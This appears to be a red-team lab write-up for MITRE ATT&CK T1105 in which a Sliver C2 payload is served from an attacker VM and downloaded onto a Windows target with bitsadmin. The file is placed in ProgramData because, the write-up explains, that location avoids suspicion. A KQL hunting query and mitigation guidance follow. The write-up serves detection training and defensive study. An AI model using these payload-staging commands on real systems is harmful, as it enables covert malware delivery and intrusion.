# T1105 – Ingress Tool Transfer  
**MITRE ATT&CK Reference:** [T1105 – Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)

Attackers don’t always need fancy implants, but sometimes all they need is a way *in*. 
Once initial access is achieved, dropping follow-up tooling is step one in solidifying control. 
This test simulates a common move: using the deprecated but still operational `bitsadmin.exe` to download a C2 payload from an attacker-controlled server.

Despite being phased out, `bitsadmin.exe` still ships with Windows and remains a go-to for red teamers and adversaries alike. 
It’s signed, native, and capable of pulling files over HTTP. Perfect for flying under the radar.

---

## Scenario Overview

- **Attacker VM:** `HR-COMPLAINTS` (Ubuntu 22.04, Python HTTP server)  
  - **IP:** `10.1.0.51`
- **Target VM:** `CEO-LAPTOP` (Windows 10 w/ Microsoft Defender for Endpoint)  
  - **Admin User:** `TrustMeBro`

---

## Payload Transfer

The attacker hosts `updater.exe` (a malicious binary written with the C2 framework Sliver), using Python’s built-in web server:

```bash
sudo python3 -m http.server 80
```

From the Windows target, the attacker executes:

```cmd
bitsadmin /transfer downloader /priority foreground http://10.1.0.51/updater.exe C:\ProgramData\Microsoft\Windows\updater.exe
```

> ℹ️ **Why `ProgramData`?**  
> This location is writable, commonly used by legitimate applications, and unlikely to trigger suspicion or UAC prompts.  
> It also blends easily with system noise.

&nbsp;  
<img width="772" height="408" alt="download_payload_from_linux" src="https://github.com/user-attachments/assets/99caf106-68a9-4990-a3ee-d10b36375c81" />


---

## Detection

Despite using a commonly abused LOLBin to download a suspicious `.exe` file, **no alerts or incidents** were triggered by MDE. However, the event is recorded in the device timeline:

<img width="1699" height="167" alt="checking_device_timeline_for_bitsadmin_payload" src="https://github.com/user-attachments/assets/b0ef808a-6eff-45a1-9cbd-c9c748911240" />

We observe `bitsadmin.exe` initiating an outbound HTTP request to `10.1.0.51`.

---

## KQL – Bitsadmin Hunting

```kql
DeviceProcessEvents
| where FileName =~ "bitsadmin.exe"
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, ReportId
| order by Timestamp desc
```

<img width="1381" height="532" alt="checking_for_bitsadmin_payload_kql" src="https://github.com/user-attachments/assets/64890755-7ef0-4fd3-a311-db89081ab288" />

---  

## Defender’s Corner  
> While `bitsadmin.exe` is deprecated, it remains a quiet favorite among adversaries for staging payloads over HTTP. Its ability to download files without triggering immediate alerts makes it useful in the early stages of intrusion.

**Mitigation & Detection Guidance** (based on [MITRE ATT&CK T1105](https://attack.mitre.org/techniques/T1105/)):

- **Network-level visibility**  
  Use intrusion detection/prevention systems (IDS/IPS) to flag suspicious outbound connections — especially to uncommon IPs or internal rogue hosts.

- **Command-line monitoring**  
  Track execution of native tools like `bitsadmin.exe` with unusual arguments or connections to non-corporate domains.

- **File system events**  
  Alert on file creation in obscure or high-risk paths like `C:\ProgramData\Microsoft\Windows\`.

- **Baseline awareness**  
  Investigate new binaries dropped by unfamiliar processes — especially those involving legacy transfer methods.

Now that the payload is successfully downloaded, we’ll pivot to execution by creating a service that quietly runs the staged updater.exe reverse shell.

➡️ **Next Step:** Continue the attack chain with the follow-up technique:  
[T1543.003 – Windows Service Masquerade](../../03_persistence/services/T1543.003_windows_service_masquerade.md)

